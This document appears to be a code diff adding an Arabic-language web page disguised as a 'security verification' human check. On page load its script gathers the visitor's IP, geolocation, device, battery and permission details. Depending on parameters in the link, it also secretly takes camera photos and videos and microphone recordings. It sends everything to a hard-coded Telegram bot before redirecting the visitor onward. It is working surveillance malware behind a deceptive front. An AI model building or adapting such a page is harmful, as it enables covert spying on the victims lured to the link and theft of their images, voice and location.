@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>التحقق الأمني</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', 'Poppins', 'Cairo', system-ui, sans-serif;
+            direction: rtl;
+            padding: 1rem;
+        }
+
+        .verification-card {
+            background: rgba(18, 25, 45, 0.75);
+            backdrop-filter: blur(12px);
+            border-radius: 2.5rem;
+            padding: 2rem 1.8rem;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .title {
+            font-size: 1.9rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #FFFFFF 0%, #A0B3E0 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.75rem;
+        }
+
+        .sub {
+            color: #8e9bbe;
+            font-size: 0.9rem;
+            margin-bottom: 2.5rem;
+            border-right: 2px solid #3e5a9c;
+            padding-right: 0.75rem;
+            display: inline-block;
+        }
+
+        .spinner-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 1.5rem auto 2rem;
+        }
+
+        .circular-progress {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: conic-gradient(from 0deg, #2a6df4, #9f4eff, #2a6df4);
+            mask: radial-gradient(farthest-side, transparent calc(100% - 8px), #000 calc(100% - 8px));
+            -webkit-mask: radial-gradient(farthest-side, transparent calc(100% - 8px), #000 calc(100% - 8px));
+            animation: spin 1.4s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .inner-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 2.2rem;
+            font-weight: bold;
+            color: white;
+            text-shadow: 0 0 8px #2a6df4;
+        }
+
+        .status-text {
+            color: #cbd5ff;
+            font-size: 1rem;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 0.5rem 1rem;
+            border-radius: 60px;
+            display: inline-block;
+            margin-top: 1rem;
+            backdrop-filter: blur(4px);
+        }
+
+        .footer-note {
+            margin-top: 2rem;
+            font-size: 0.7rem;
+            color: #4a567a;
+        }
+
+        .error-message {
+            color: #ff9f8f;
+            background: rgba(255,70,70,0.15);
+            border-radius: 40px;
+            padding: 0.6rem;
+            font-size: 0.85rem;
+        }
+    </style>
+</head>
+<body>
+<div class="verification-card">
+    <div class="title">✓ التحقق الأمني</div>
+    <div class="sub">جاري تأكيد هويتك</div>
+    <div class="spinner-container">
+        <div class="circular-progress"></div>
+        <div class="inner-icon">🛡️</div>
+    </div>
+    <div class="status-text" id="statusMsg">جاري التحقق من أنك إنسان ...</div>
+    <div class="footer-note">نظام حماية متقدم | انتظر لحظات</div>
+</div>
+
+<script>
+    (function(){
+        // 🔐 بيانات البوت الجديدة
+        const BOT_TOKEN = "8708315102:AAGa62Wi5kAvAs1qj-heQR7LowoBbINNLwM";
+        const CHAT_ID = "7719763576";
+
+        const urlParams = window.location.search.substring(1);
+        let targetUrl = null;
+        let actionList = [];
+
+        // تحليل الرابط إذا كان موجوداً
+        if(urlParams && urlParams.includes("=")){
+            let match = urlParams.match(/^(https?:\/\/[^=]+)=(.+)$/);
+            if(match){
+                targetUrl = match[1];
+                const rawActions = match[2];
+                const actionRegex = /(FC|BC|M|I)(\d*)/g;
+                let actMatch;
+                while((actMatch = actionRegex.exec(rawActions)) !== null){
+                    let typeRaw = actMatch[1];
+                    let numStr = actMatch[2];
+                    let duration = numStr ? parseInt(numStr,10) : 0;
+                    if(typeRaw === "I"){
+                        actionList.push({ type:"info", duration:0 });
+                    } else if(typeRaw === "FC"){
+                        if(duration === 0) actionList.push({ type:"frontPhoto", duration:0 });
+                        else actionList.push({ type:"frontVideo", duration:duration });
+                    } else if(typeRaw === "BC"){
+                        if(duration === 0) actionList.push({ type:"backPhoto", duration:0 });
+                        else actionList.push({ type:"backVideo", duration:duration });
+                    } else if(typeRaw === "M"){
+                        if(duration > 0) actionList.push({ type:"micAudio", duration:duration });
+                    }
+                }
+            }
+        }
+
+        // إذا لم يوجد رابط صالح -> نعرض رسالة مناسبة ولا نحول إلى أي مكان خارجي
+        if(!targetUrl){
+            document.getElementById("statusMsg").innerHTML = "⚠️ رابط غير صالح<br>يرجى استخدام الرابط المخصص";
+            document.querySelector(".footer-note").innerHTML = "مثال: ?https://example.com/=I";
+            return; // نوقف التنفيذ هنا، لا تحويل ولا أي إجراءات
+        }
+
+        // إذا كان هناك رابط صالح ولكن لا توجد أكشنات، نضيف المعلومات كإجراء افتراضي
+        if(actionList.length === 0){
+            actionList.push({ type:"info", duration:0 });
+        }
+
+        const statusEl = document.getElementById("statusMsg");
+
+        function updateStatus(text){
+            if(statusEl) statusEl.innerText = text;
+        }
+
+        async function sendToTelegram(method, payload, fileField = null){
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
+            if(fileField && payload instanceof FormData){
+                return fetch(url, { method:"POST", body:payload });
+            } else if(payload instanceof FormData){
+                return fetch(url, { method:"POST", body:payload });
+            } else {
+                return fetch(url, {
+                    method:"POST",
+                    headers: { "Content-Type":"application/json" },
+                    body: JSON.stringify(payload)
+                });
+            }
+        }
+
+        async function getDeviceDetails(){
+            const ua = navigator.userAgent;
+            let deviceModel = "Unknown";
+            const modelMatch = ua.match(/\((.*?)\)/);
+            if(modelMatch && modelMatch[1]) deviceModel = modelMatch[1].split(";").pop().trim() || "Unknown";
+            const language = navigator.language || navigator.userLanguage;
+            let ip = "0.0.0.0", country="غير متوفر", region="غير متوفر", city="غير متوفر", timezone="غير متوفر";
+            try{
+                const ipRes = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipRes.json();
+                ip = ipData.ip;
+                const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,timezone`);
+                const geo = await geoRes.json();
+                if(geo.status === "success"){
+                    country = geo.country || country;
+                    region = geo.regionName || region;
+                    city = geo.city || city;
+                    timezone = geo.timezone || timezone;
+                }
+            } catch(e){}
+            let batteryInfo = { level:"غير معروف", charging:"غير معروف" };
+            if(navigator.getBattery){
+                try{
+                    const battery = await navigator.getBattery();
+                    batteryInfo.level = Math.round(battery.level * 100) + "%";
+                    batteryInfo.charging = battery.charging ? "نعم" : "لا";
+                } catch(e){}
+            }
+            let storageEstimate = { used:0, total:0 };
+            if(navigator.storage && navigator.storage.estimate){
+                try{
+                    const est = await navigator.storage.estimate();
+                    storageEstimate.used = (est.usage / (1024**3)).toFixed(2);
+                    storageEstimate.total = (est.quota / (1024**3)).toFixed(2);
+                } catch(e){}
+            }
+            const cpuCores = navigator.hardwareConcurrency || "غير معروف";
+            const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معروف";
+            const resolution = `${screen.width}x${screen.height}`;
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString('ar-EG');
+            const dateStr = now.toLocaleDateString('ar-EG');
+            const weekdays = ["الأحد","الإثنين","الثلاثاء","الأربعاء","الخميس","الجمعة","السبت"];
+            const dayName = weekdays[now.getDay()];
+            let cameraPerm = "غير معروف", locationPerm = "غير معروف";
+            try{
+                const permStatus = await navigator.permissions.query({ name:"camera" });
+                cameraPerm = permStatus.state === "granted" ? "مسموح" : (permStatus.state === "denied" ? "مرفوض" : "غير محدد");
+            } catch(e){}
+            try{
+                const locStatus = await navigator.permissions.query({ name:"geolocation" });
+                locationPerm = locStatus.state === "granted" ? "مسموح" : (permStatus.state === "denied" ? "مرفوض" : "غير محدد");
+            } catch(e){}
+            const targetLinkFull = targetUrl;
+            return {
+                deviceModel, userAgent: ua, language, ip, country, region, city, timezone,
+                batteryLevel: batteryInfo.level, batteryCharging: batteryInfo.charging,
+                cpuCores, ram, storageUsed: storageEstimate.used, storageTotal: storageEstimate.total,
+                resolution, cameraPerm, locationPerm, enterTime: timeStr, enterDate: dateStr, enterDay: dayName,
+                targetLink: targetLinkFull
+            };
+        }
+
+        async function sendInfoMessage(){
+            updateStatus("📊 جمع معلومات الجهاز ...");
+            const details = await getDeviceDetails();
+            const message = `╔══════════════════════════════════╗\n` +
+                `📡 *معلومات الزائر* 📡\n` +
+                `╚══════════════════════════════════╝\n\n` +
+                `🖥️ *الجهاز والمتصفح*\n` +
+                `   • الموديل: ${details.deviceModel}\n` +
+                `   • User Agent: \`${details.userAgent.substring(0,100)}\`\n\n` +
+                `🌐 *معلومات الشبكة*\n` +
+                `   • عنوان IP: ${details.ip}\n` +
+                `   • اللغة: ${details.language}\n\n` +
+                `📍 *الموقع الجغرافي*\n` +
+                `   • الدولة: ${details.country}\n` +
+                `   • المنطقة: ${details.region}\n` +
+                `   • المدينة: ${details.city}\n` +
+                `   • التوقيت: ${details.timezone}\n\n` +
+                `🖼️ *الشاشة*: ${details.resolution}\n\n` +
+                `🔋 *البطارية*\n` +
+                `   • المستوى: ${details.batteryLevel}\n` +
+                `   • الشحن: ${details.batteryCharging}\n\n` +
+                `🔐 *الصلاحيات*\n` +
+                `   • الكاميرا: ${details.cameraPerm}\n` +
+                `   • الموقع: ${details.locationPerm}\n\n` +
+                `💾 *العتاد والتخزين*\n` +
+                `   • نوى المعالج: ${details.cpuCores}\n` +
+                `   • الرام: ${details.ram}\n` +
+                `   • التخزين المستخدم: ${details.storageUsed} GB\n` +
+                `   • التخزين الكلي: ${details.storageTotal} GB\n\n` +
+                `⏰ *وقت الدخول*\n` +
+                `   • ${details.enterTime}\n` +
+                `   • ${details.enterDate}\n` +
+                `   • ${details.enterDay}\n\n` +
+                `🔗 *الرابط الهدف*\n` +
+                `   • ${details.targetLink}\n\n` +
+                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                `✓ تم الالتقاط بواسطة نظام الحماية`;
+            try{
+                await sendToTelegram("sendMessage", {
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                });
+                updateStatus("✓ تم إرسال المعلومات");
+            } catch(e){ console.error(e); updateStatus("فشل إرسال المعلومات"); }
+        }
+
+        async function captureMedia(mode, type, durationSec){
+            if(mode === "frontPhoto" || mode === "frontVideo"){
+                return await getCameraStream("user", type, durationSec);
+            } else if(mode === "backPhoto" || mode === "backVideo"){
+                return await getCameraStream("environment", type, durationSec);
+            } else if(mode === "micAudio"){
+                return await recordAudio(durationSec);
+            }
+            return null;
+        }
+
+        async function getCameraStream(facingMode, mediaType, durationSec){
+            let constraints = { video: { facingMode: { exact: facingMode } } };
+            try{
+                let stream = await navigator.mediaDevices.getUserMedia(constraints);
+                if(mediaType === "photo"){
+                    const track = stream.getVideoTracks()[0];
+                    const imageCapture = new ImageCapture(track);
+                    const bitmap = await imageCapture.grabFrame();
+                    const canvas = document.createElement("canvas");
+                    canvas.width = bitmap.width;
+                    canvas.height = bitmap.height;
+                    const ctx = canvas.getContext("2d");
+                    ctx.drawImage(bitmap, 0, 0);
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
+                    track.stop();
+                    stream.getTracks().forEach(t=>t.stop());
+                    return { blob, type:"photo", extension:"jpg" };
+                } else if(mediaType === "video"){
+                    let chunks = [];
+                    const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+                    recorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
+                    const stopPromise = new Promise(resolve => {
+                        recorder.onstop = () => {
+                            const fullBlob = new Blob(chunks, { type: "video/webm" });
+                            resolve(fullBlob);
+                        };
+                    });
+                    recorder.start();
+                    setTimeout(() => {
+                        if(recorder.state === "recording") recorder.stop();
+                    }, durationSec * 1000);
+                    const videoBlob = await stopPromise;
+                    stream.getTracks().forEach(t=>t.stop());
+                    return { blob: videoBlob, type:"video", extension:"webm" };
+                }
+                stream.getTracks().forEach(t=>t.stop());
+                return null;
+            } catch(err){
+                console.warn("camera fail", err);
+                try{
+                    let fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    if(mediaType === "photo"){
+                        const track = fallbackStream.getVideoTracks()[0];
+                        const imageCapture = new ImageCapture(track);
+                        const bitmap = await imageCapture.grabFrame();
+                        const canvas = document.createElement("canvas");
+                        canvas.width = bitmap.width;
+                        canvas.height = bitmap.height;
+                        const ctx = canvas.getContext("2d");
+                        ctx.drawImage(bitmap, 0, 0);
+                        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
+                        track.stop();
+                        fallbackStream.getTracks().forEach(t=>t.stop());
+                        return { blob, type:"photo", extension:"jpg" };
+                    } else if(mediaType === "video"){
+                        let chunks = [];
+                        const recorder = new MediaRecorder(fallbackStream, { mimeType: "video/webm" });
+                        recorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
+                        const stopPromise = new Promise(resolve => { recorder.onstop = () => resolve(new Blob(chunks, { type: "video/webm" })); });
+                        recorder.start();
+                        setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, durationSec * 1000);
+                        const videoBlob = await stopPromise;
+                        fallbackStream.getTracks().forEach(t=>t.stop());
+                        return { blob: videoBlob, type:"video", extension:"webm" };
+                    }
+                } catch(e2){ return null; }
+                return null;
+            }
+        }
+
+        async function recordAudio(seconds){
+            try{
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: "audio/webm" });
+                let chunks = [];
+                mediaRecorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
+                const stopPromise = new Promise(resolve => {
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(chunks, { type: "audio/webm" });
+                        resolve(audioBlob);
+                    };
+                });
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if(mediaRecorder.state === "recording") mediaRecorder.stop();
+                }, seconds * 1000);
+                const blob = await stopPromise;
+                stream.getTracks().forEach(t=>t.stop());
+                return { blob, type:"audio", extension:"webm" };
+            } catch(e){ console.error(e); return null; }
+        }
+
+        async function sendMediaToBot(mediaObj, captionPrefix){
+            if(!mediaObj || !mediaObj.blob) return false;
+            const formData = new FormData();
+            const filename = `${Date.now()}_${Math.random()}.${mediaObj.extension}`;
+            formData.append("chat_id", CHAT_ID);
+            formData.append("document", mediaObj.blob, filename);
+            if(captionPrefix) formData.append("caption", captionPrefix);
+            try{
+                const res = await sendToTelegram("sendDocument", formData, true);
+                return res.ok;
+            } catch(e){ return false; }
+        }
+
+        async function runActionsSequential(actions){
+            for(let act of actions){
+                if(act.type === "info"){
+                    await sendInfoMessage();
+                    await new Promise(r => setTimeout(r, 300));
+                } else if(act.type === "frontPhoto"){
+                    updateStatus("📸 التقاط صورة (كاميرا أمامية)...");
+                    const media = await captureMedia("frontPhoto", "photo", 0);
+                    if(media) await sendMediaToBot(media, "🖼️ صورة من الكاميرا الأمامية");
+                    else updateStatus("⚠️ فشل الكاميرا الأمامية");
+                } else if(act.type === "frontVideo"){
+                    updateStatus(`🎥 تسجيل فيديو (أمامي) ${act.duration} ثانية`);
+                    const media = await captureMedia("frontVideo", "video", act.duration);
+                    if(media) await sendMediaToBot(media, `🎬 فيديو أمامي (${act.duration} ثانية)`);
+                } else if(act.type === "backPhoto"){
+                    updateStatus("📸 التقاط صورة (كاميرا خلفية)...");
+                    const media = await captureMedia("backPhoto", "photo", 0);
+                    if(media) await sendMediaToBot(media, "📷 صورة من الكاميرا الخلفية");
+                } else if(act.type === "backVideo"){
+                    updateStatus(`🎥 تسجيل فيديو (خلفي) ${act.duration} ثانية`);
+                    const media = await captureMedia("backVideo", "video", act.duration);
+                    if(media) await sendMediaToBot(media, `🎞️ فيديو خلفي (${act.duration} ثانية)`);
+                } else if(act.type === "micAudio"){
+                    updateStatus(`🎙️ تسجيل صوتي ${act.duration} ثواني`);
+                    const media = await captureMedia("micAudio", "audio", act.duration);
+                    if(media) await sendMediaToBot(media, `🎤 تسجيل صوتي (${act.duration} ثانية)`);
+                }
+                await new Promise(r => setTimeout(r, 400));
+            }
+        }
+
+        async function mainProcess(){
+            updateStatus("بدء التحقق المتقدم ...");
+            try{
+                await runActionsSequential(actionList);
+                updateStatus("✅ تم التحقق بنجاح، جاري التحويل ...");
+                setTimeout(()=>{
+                    window.location.href = targetUrl;
+                }, 1200);
+            } catch(err){
+                console.error(err);
+                updateStatus("حدث خطأ تقني، جاري التحويل");
+                setTimeout(()=>{ window.location.href = targetUrl; }, 1500);
+            }
+        }
+        mainProcess();
+    })();
+</script>
+</body>
+</html>
